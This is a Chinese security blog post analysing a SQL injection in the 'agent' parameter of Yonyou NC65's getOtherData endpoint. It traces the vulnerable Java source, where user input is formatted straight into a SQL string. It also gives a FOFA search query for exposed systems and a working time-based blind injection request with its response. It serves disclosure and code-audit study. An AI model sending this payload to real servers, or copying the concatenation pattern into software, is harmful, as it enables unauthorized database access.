---
title: "用友NC getOtherData SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-getOtherData-agent-sqli.html
asset_dir: assets/用友nc-getotherdata-sql注入漏洞
---

# 用友NC getOtherData SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/24 10:41
- 1386浏览
- [0评论](#comment)
- 1小时阅读

深入探索

dbms

sql

SQL

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友") NC 是一种商业级的[企业资源规划](#)，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC getOtherData 接口处agent参数存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可以通过此漏洞获取数据库权限，进一步利用可导致服务器失陷。

SQL注入检测工具

# 影响版本

NC65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

根据官方漏洞通告,NC系统/portal/pt/oacoSchedulerEvents/getOtherData传入的参数agent存在SQL注入

深入探索

物流软件安全

文本剥离工具

Nessus

[![用友NC getOtherData SQL注入漏洞](images/img-001-863c1a01a354.webp)](https://image.mrxn.net/472cdca3973c4ca5a14e8fb667e4674d.webp)

先看 `modules/oaco/lib/puboaco_schedulermgr/nc/bs/oa/oaco/scheduler/action/SchedulerEventsAction.java` 里 `getOtherData` 的实现

```
@Action
    public void getOtherData() throws BusinessException {
        String sch_startdate = this.getRequest().getParameter("sch_sd");
        String sch_enddate = this.getRequest().getParameter("sch_ed");
        String agent = this.getRequest().getParameter("agent");
        ISchedulerQueryService schedulerQueryService = (ISchedulerQueryService)NCLocator.getInstance().lookup(ISchedulerQueryService.class);
        String xml = schedulerQueryService.getOtherData(agent, sch_startdate, sch_enddate);
        CommonUtils.outputClientStreamWithGzip(this.getResponse(), "text/xml", xml);
    }
```

将前端传入的 `agent` 参数传入 `schedulerQueryService` 的 `getOtherData` ，跟进看下

代码安全审计

```
public String getOtherData(String pkuser, String startdate, String enddate) throws BusinessException {
        return this.getDAO().getOtherData(pkuser, startdate, enddate);
    }
```

`modules/oaco/META-INF/lib/oaco_schedulermgr/nc/impl/oa/oaco/scheduler/SchedulerEventDAO.java`

最终实现如下

```
public String getOtherData(String pkuser, String startdate, String enddate) throws BusinessException {
        Map<String, String[]> sharingUsersMap = this.getDataOfUserSharingEvents(startdate, enddate, pkuser);
        int taskListCount = 0;
        StringBuilder sb = new StringBuilder();
        sb.append("<?xml version='1.0' encoding='UTF-8' ?>");
        sb.append("<data>");
        sb.append("<share>");
        Iterator<Map.Entry<String, String[]>> iter = sharingUsersMap.entrySet().iterator();
        String[] tmp = null;
        while (iter.hasNext()) {
            Map.Entry<String, String[]> ent = iter.next();
            tmp = ent.getValue();
            sb.append("<user><name><![CDATA[").append(tmp[0]).append("]]></name><value><![CDATA[").append(ent.getKey()).append("]]></value><color><![CDATA[").append(tmp[2]).append("]]></color><stat><![CDATA[").append(tmp[1]).append("]]></stat></user>");
        }
        sb.append("</share>");
        sb.append("<task>");
        sb.append("<count><![CDATA[").append(taskListCount).append("]]></count>");
        sb.append("</task>");
        sb.append("</data>");
        return sb.toString();
    }
```

`pkuser` 带入 `getDataOfUserSharingEvents`

```
private Map<String, String[]> getDataOfUserSharingEvents(String startdate, String enddate, String agent) throws BusinessException {
        String pk_user = StringUtils.isNotEmpty((String)agent) ? agent : (String)CommonUtils.getCurrentPkPerson();
        ICpUserQry cpuserQuery = (ICpUserQry)NCLocator.getInstance().lookup(ICpUserQry.class);
        ISchedulerCacheQueryService schedulerCacheQueryService = (ISchedulerCacheQueryService)NCLocator.getInstance().lookup(ISchedulerCacheQueryService.class);
        String whereSql = this.getWhereSqlOfUserPksOfSharedEvent(pk_user, startdate, enddate);
        CpUserVO[] cpusers = cpuserQuery.getUserByWhere("cuserid in(" + whereSql + ")");
        HashMap<String, String[]> sharingUsersMap = new HashMap<String, String[]>();
        if (cpusers == null) {
            return sharingUsersMap;
        }
        for (int i = 0; i < cpusers.length; ++i) {
            sharingUsersMap.put(cpusers[i].getCuserid(), new String[]{SQLHelper.getMuiltiLangValue((SuperVO)cpusers[i], (String)"user_name"), "false", ColorGenaretor.getColor((int)i)});
        }
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < cpusers.length; ++i) {
            sb.append("'").append(cpusers[i].getCuserid()).append("'").append(",");
        }
        if (StringUtils.isEmpty((String)sb.toString())) {
            return sharingUsersMap;
        }
        SchedulerCacheVO[] cachevos = schedulerCacheQueryService.getSchedulerCaches("sourceobj='" + pk_user + "' and targetobj in(" + SchedulerUtils.trimEnd((String)sb.toString(), (String)",") + ") and cachekey='share_color'");
        String[] tmp = null;
```

继续跟进 `getWhereSqlOfUserPksOfSharedEvent`

```
private String getWhereSqlOfUserPksOfSharedEvent(String pk_current_user, String start_date, String end_date) {
        String scopeSetWhereSql = "";
        try {
            scopeSetWhereSql = ScopeSetUtil.getScopeSetWhereSql((String)pk_current_user, (String)"oacoscheduler", (String)"fk_share", (boolean)true, (boolean)true, (boolean)true, (boolean)true);
        }
        catch (LfwBusinessException e) {
            Logger.error((Object)e.getMessage());
        }
        String sql = "select distinct a.pk_user from oaco_schedulerevent a  where a.pk_user <> '%s' and a.pk_event in %s";
        sql = sql + " and ('%s' between a.recurstartdate and a.recurenddate or '%s' between a.recurstartdate and a.recurenddate or a.recurstartdate between '%s' and '%s') ";
        sql = String.format(sql, pk_current_user, scopeSetWhereSql, start_date, end_date, start_date, end_date);
        return sql;
    }
```

返回处理后的SQL语句，其中 `pk_current_user` 即初始的 `agent` 直接拼接进SQL语句，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")，需要注意 `cpuserQuery.getUserByWhere("cuserid in(" + whereSql + ")");` SQL 语句最终拼接进此in语句里，因此复现时需要闭合单引号和此括号。

漏洞修复方案

# 漏洞复现

```
GET /portal/pt/oacoSchedulerEvents/getOtherData?agent=1')and+1=dbms_pipe.receive_message('RDS',3)--&pageId=login&sch_ed=1&sch_sd=1 HTTP/1.0
Host: nc65.mrxn.net

HTTP/1.1 200 OK
Date: Thu, 13 Jan 2025 10:21:37 GMT
Server: IBM_HTTP_Server
Cache-Control: no-cache
Vary: Accept-Encoding
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Connection: close
Content-Type: text/xml
Content-Language: zh-CN
Content-Length: 108

<?xml version='1.0' encoding='UTF-8' ?><data><share></share><task><count><![CDATA[0]]></count></task></data>
```

成功延时 9 秒（因为会执行三次）

企业资源规划

[![用友NC getOtherData SQL注入漏洞](images/img-002-3a356dde79a1.webp)](https://image.mrxn.net/531bb78cc65246ca80feb3b39ef07465.webp)

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=587`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
